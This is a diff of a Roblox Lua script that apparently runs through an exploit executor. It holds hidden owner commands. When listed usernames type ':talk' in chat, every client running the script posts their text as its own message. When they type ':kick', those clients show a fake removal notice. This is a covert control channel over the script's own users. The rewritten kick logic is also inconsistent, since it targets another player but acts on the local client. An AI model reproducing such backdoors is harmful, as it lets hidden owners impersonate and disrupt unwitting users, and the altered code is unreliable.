@@ -15,9 +15,6 @@ local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
 local ownerNames = {
-    ["x8lx8x"] = true,
-    ["xleskyy"] = true,
-    ["jkux"] = true, -- zippersman
     ["R0cketLucky2020"] = true
 }
 
@@ -26,17 +23,16 @@ local function isOwner(name)
     return ownerNames[name:lower()] == true
 end
 
--- Find a player from a name fragment (username or displayname)
+-- Find player by partial name (Username or DisplayName)
 local function findPlayerByName(nameFragment)
     nameFragment = nameFragment:lower()
     for _, plr in ipairs(Players:GetPlayers()) do
-        local uname = plr.Name:lower()
-        local dname = plr.DisplayName:lower()
-
-        if uname == nameFragment or dname == nameFragment then
-            return plr
-        elseif uname:find(nameFragment) or dname:find(nameFragment) then
-            return plr
+        if plr ~= LocalPlayer then -- Prevent self-kick
+            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
+                return plr
+            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
+                return plr
+            end
         end
     end
     return nil
@@ -50,28 +46,19 @@ local function handleCommand(message, speaker)
     local cmd = args[1]:lower()
 
     if cmd == ":talk" then
-        local say = message:sub(#cmd + 2)
-        local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        local say = message:sub(#args[1] + 2)
+        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
         if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
             chatRemote.SayMessageRequest:FireServer(say, "All")
         end
 
     elseif cmd == ":kick" and args[2] then
-        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1"):lower()
-        local match = false
+        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
+        local targetPlayer = findPlayerByName(targetName)
 
-        -- Check if this local player matches the kick target
-        if not isOwner(LocalPlayer.Name) then -- Don't allow owners to be kicked
-            local uname = LocalPlayer.Name:lower()
-            local dname = LocalPlayer.DisplayName:lower()
-
-            if uname == targetName or dname == targetName or uname:find(targetName) or dname:find(targetName) then
-                match = true
-            end
-        end
-
-        if match then
-            StarterGui:SetCore("SendNotification", {
+        if targetPlayer then
+            if targetPlayer == LocalPlayer then return end -- Never kick yourself
+            game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "You’ve been kicked",
                 Text = "The owner removed your access.",
                 Duration = 5
@@ -82,20 +69,20 @@ local function handleCommand(message, speaker)
     end
 end
 
--- Connect to chat events of a player
+-- Connect to all existing and future players
 local function connectPlayer(plr)
     plr.Chatted:Connect(function(msg)
         handleCommand(msg, plr)
     end)
 end
 
--- Connect all existing players
 for _, plr in ipairs(Players:GetPlayers()) do
     connectPlayer(plr)
 end
 
--- Connect future players
 Players.PlayerAdded:Connect(connectPlayer)
+
+
 
 
 -- Executor Check
